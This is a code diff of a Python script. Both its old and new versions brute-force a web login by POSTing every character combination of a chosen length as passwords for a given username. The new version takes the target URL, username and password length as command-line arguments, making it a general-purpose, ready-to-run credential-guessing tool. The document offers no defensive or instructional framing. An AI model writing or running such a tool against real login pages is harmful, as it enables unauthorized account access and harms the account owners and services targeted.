@@ -1,47 +1,41 @@
-# PPC 
-
-
-import itertools
-import string
 import requests
+import sys
+import string
+import itertools
 
-# Generate all possible combinations of symbols, digits, uppercase and lowercase letters
-def generate_combinations(length):
-    characters = string.ascii_letters + string.digits + string.punctuation  # Letters, digits, symbols
-    return itertools.product(characters, repeat=length)
-
-# Function to send a request
-def try_password(username, password):
-    url = "http://example.com/login"  # Replace with the server address
-    data = {
-        "username": username,  # Field for the username
-        "password": password   # Field for the password
-    }
-    
-    try:
-        # Example POST request
-        response = requests.post(url, data=data)
-        
-        # Logging current password attempt and response
-        print(f"Attempt: {username} | {password}, Response: {response.status_code}")
-        
-        # Check for success (depends on the specific server response)
-        if "Success" in response.text:  # Change to the appropriate success condition
-            print(f"Password found for user {username}: {password}")
-            return True
-    except Exception as e:
-        print(f"Error sending request: {e}")
-    
-    return False
-
-# Iterating through all possible combinations
-def brute_force_password(username, length):
-    for combination in generate_combinations(length):
-        password = ''.join(combination)
-        
-        # Sending the current password
-        if try_password(username, password):
+def brute_force(url, username, password_length):
+    # Generate possible passwords from letters and digits
+    charset = string.ascii_letters + string.digits
+    for attempt in itertools.product(charset, repeat=password_length):
+        password = ''.join(attempt)
+        data = {
+            "username": username,
+            "password": password
+        }
+        try:
+            # Send POST request to the server
+            response = requests.post(url, json=data)
+            print(f"Trying: {password} - Status Code: {response.status_code}")
+            if "Success" in response.text:
+                print(f"Success! The password is: {password}")
+                break
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
             break
 
-# Starting the password brute force for the user "myusername" with length 4
-brute_force_password("myusername", 4)
+if __name__ == "__main__":
+    # Check if correct number of arguments is passed
+    if len(sys.argv) != 4:
+        print("Usage: python3 brute_force.py <url> <username> <passwordLength>")
+        sys.exit(1)
+
+    url = sys.argv[1]  # URL for sending requests
+    username = sys.argv[2]  # Username for login attempt
+    try:
+        password_length = int(sys.argv[3])  # Length of the password to brute-force
+    except ValueError:
+        print("Password length must be an integer.")
+        sys.exit(1)
+
+    # Call the brute force function
+    brute_force(url, username, password_length)
